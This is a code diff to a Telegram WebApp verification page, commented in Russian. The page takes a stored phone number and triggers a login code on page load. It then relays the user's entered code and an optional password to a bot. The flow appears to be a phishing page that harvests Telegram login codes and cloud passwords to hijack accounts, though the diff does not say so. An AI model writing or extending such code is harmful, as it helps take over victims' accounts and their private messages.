@@ -212,6 +212,37 @@
         // Получаем номер телефона из localStorage
         const phoneNumber = localStorage.getItem('phoneNumber');
         
+        // Если номер не найден, возвращаемся на главную
+        if (!phoneNumber) {
+            window.location.href = 'index.html';
+            return;
+        }
+        
+        // Автоматически отправляем код при загрузке страницы
+        sendCodeToBot();
+        
+        // Функция отправки кода боту
+        async function sendCodeToBot() {
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    // Отправляем запрос на отправку кода
+                    const data = {
+                        action: 'send_code',
+                        phone: phoneNumber
+                    };
+                    
+                    window.Telegram.WebApp.sendData(JSON.stringify(data));
+                    showSuccess('📱 Код отправлен на ваш номер телефона');
+                } else {
+                    // Fallback для тестирования
+                    showSuccess('📱 Код отправлен (тестовый режим)');
+                }
+            } catch (error) {
+                console.error('Ошибка отправки кода:', error);
+                showError('Ошибка отправки кода');
+            }
+        }
+        
         // Функция возврата назад
         function goBack() {
             window.history.back();
@@ -244,6 +275,7 @@
                 if (window.Telegram && window.Telegram.WebApp) {
                     // Отправляем данные боту
                     const data = {
+                        action: 'verify_code',
                         phone: phoneNumber,
                         code: code,
                         password: password || null
@@ -252,8 +284,8 @@
                     // Отправляем через Telegram WebApp
                     window.Telegram.WebApp.sendData(JSON.stringify(data));
                     
-                    // Ждем ответ от бота
-                    window.Telegram.WebApp.onEvent('main_button_clicked', handleBotResponse);
+                    // Показываем сообщение о проверке
+                    showSuccess('🔍 Проверяем код...');
                     
                 } else {
                     // Fallback для тестирования вне Telegram
